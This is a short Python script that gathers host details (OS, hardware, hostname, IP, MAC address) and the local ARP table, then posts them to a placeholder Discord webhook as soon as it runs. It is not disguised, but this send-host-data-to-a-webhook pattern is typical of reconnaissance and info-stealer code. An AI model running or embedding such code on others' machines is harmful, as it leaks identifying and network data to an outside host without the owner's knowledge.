import platform
import psutil
import requests
import socket
import os
import getpass
import subprocess

# Function to get the MAC address
def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:  # This is the MAC address
                return addr.address
    return "MAC address not found"

# Function to gather basic system information
def get_system_info():
    system_info = {
        'OS': platform.system(),
        'OS Version': platform.version(),
        'OS Release': platform.release(),
        'Architecture': platform.architecture()[0],
        'CPU': platform.processor(),
        'CPU Cores': psutil.cpu_count(logical=False),
        'Logical CPUs': psutil.cpu_count(logical=True),
        'RAM': round(psutil.virtual_memory().total / (1024.0 ** 3), 2),  # GB
        'Hostname': socket.gethostname(),
        'IP Address': socket.gethostbyname(socket.gethostname()),
        'MAC Address': get_mac_address()
    }
    return system_info

# Function to run the arp -a command and get the output
def get_arp_table():
    try:
        # Run the command and capture output
        result = subprocess.check_output('arp -a', shell=True, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"Error retrieving ARP table: {e}"

# Function to send data to Discord webhook
def send_to_discord(webhook_url, system_info, arp_output):
    message = {
        "content": "System Information Report",
        "embeds": [{
            "title": "System Info",
            "fields": [{"name": key, "value": str(value), "inline": False} for key, value in system_info.items()]
        }]
    }

    # Add ARP table output as a field in the message
    message['embeds'].append({
        "title": "ARP Table",
        "fields": [{
            "name": "ARP Table Output",
            "value": f"```{arp_output}```",  # Using code block formatting for better presentation
            "inline": False
        }]
    })

    # Send the data to Discord
    try:
        response = requests.post(webhook_url, json=message)
        if response.status_code == 204:
            print("Successfully sent to Discord!")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

# Main function to perform the task
def perform_task():
    print("Gathering system information...")
    system_info = get_system_info()

    print("Running 'arp -a' command...")
    arp_output = get_arp_table()

    print("Sending data to Discord...")
    # Replace this with your actual webhook URL
    webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
    send_to_discord(webhook_url, system_info, arp_output)

    print("Task completed.")

# Run the task
perform_task()
